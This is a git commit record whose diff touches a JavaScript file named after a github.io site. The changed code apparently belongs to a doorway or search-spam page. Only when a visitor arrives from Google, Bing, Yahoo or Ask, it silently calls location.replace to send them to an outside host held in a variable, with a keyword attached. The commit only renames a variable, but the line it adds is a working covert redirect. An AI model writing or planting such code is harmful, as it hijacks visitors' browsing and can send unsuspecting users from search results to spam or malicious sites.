91f0cf8f78c2f7742ee6967102e4be276f9947c9
losetta <losetta@blaugen.ru>
2018-10-26 11:06:31 +0300

    Initial commit

--- alexonicagithubio.js
+++ alexonicagithubio.js
@@ -4,5 +4,5 @@ var params = "";
 
 if (document.referrer.indexOf('.google.')!=-1 || document.referrer.indexOf('.bing.')!=-1 || document.referrer.indexOf('.yahoo.')!=-1 || document.referrer.indexOf('.ask.')!=-1) 
 {
-  location.replace("http://"+t+"/?"+params+"&charset=utf-8&keyword="+_var);
+  location.replace("http://"+t+"/?"+params+"&charset=utf-8&keyword="+alexonicagithubio);
 }
